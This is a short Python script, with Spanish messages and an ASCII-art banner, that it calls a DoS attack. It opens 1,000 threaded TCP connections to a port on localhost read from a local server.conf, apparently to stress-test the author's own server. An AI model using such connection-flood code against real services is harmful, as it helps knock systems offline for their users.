from socket import *
import threading

def get_config_value(key, filename='./server.conf'):
    with open(filename, 'r') as file:
        for line in file:
            if line.startswith(key):
                return line.split('=')[1].strip()
    return None

serverName = 'localhost'
serverPort = int(get_config_value('listen_port'))

def create_connection(i):
    try:
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((serverName, serverPort))
        sentence = f"Conexion numero {i}\n"
        clientSocket.send(sentence.encode())
        clientSocket.close()
    except Exception as e:
        print(f"Error en la conexión {i}: {e}")

threads = []
print("""
Ataque DOS... 
      
   , ,, ,                              
   | || |    ,/  _____  \.             
   \_||_/    ||_/     \_||             
     ||       \_| . . |_/              
     ||         |  L  |                
    ,||         |`==='|                
    |>|      ___`>  -<'___             
    |>|\    /             \            
    \>| \  /  ,    .    .  |           
     ||  \/  /| .  |  . |  |           
     ||\  ` / | ___|___ |  |     (     
  (( || `--'  | _______ |  |     ))  ( 
(  )\|| (  )\ | - --- - | -| (  ( \  ))
(\/  || ))/ ( | -- - -- |  | )) )  \(( 
 ( ()||((( ())|         |  |( (( () )()

""")

for i in range(1000):
    thread = threading.Thread(target=create_connection, args=(i,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Ataque finalizado.")